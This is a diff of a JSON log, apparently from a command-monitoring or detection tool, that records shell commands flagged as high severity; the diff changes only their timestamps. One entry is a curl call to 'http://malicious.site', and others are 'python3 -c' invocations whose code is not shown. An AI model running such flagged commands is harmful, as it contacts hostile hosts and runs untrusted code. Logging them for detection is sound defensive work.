@@ -1,6 +1,6 @@
 [
   {
-    "timestamp": "2025-05-16T15:29:36.586221-05:00",
+    "timestamp": "2025-05-16T15:33:12.469593-05:00",
     "command": "curl",
     "args": [
       "http://malicious.site"
@@ -9,7 +9,7 @@
     "severity": "high"
   },
   {
-    "timestamp": "2025-05-16T15:29:36.629041-05:00",
+    "timestamp": "2025-05-16T15:33:12.522625-05:00",
     "command": "python3",
     "args": [
       "-c",
@@ -19,7 +19,7 @@
     "severity": "high"
   },
   {
-    "timestamp": "2025-05-16T15:29:36.629041-05:00",
+    "timestamp": "2025-05-16T15:33:12.522625-05:00",
     "command": "python3",
     "args": [
       "-c",
@@ -29,7 +29,7 @@
     "severity": "high"
   },
   {
-    "timestamp": "2025-05-16T15:29:36.65705-05:00",
+    "timestamp": "2025-05-16T15:33:12.549364-05:00",
     "command": "python3",
     "args": [
       "-c",
@@ -39,7 +39,7 @@
     "severity": "high"
   },
   {
-    "timestamp": "2025-05-16T15:29:36.65705-05:00",
+    "timestamp": "2025-05-16T15:33:12.549364-05:00",
     "command": "python3",
     "args": [
       "-c",
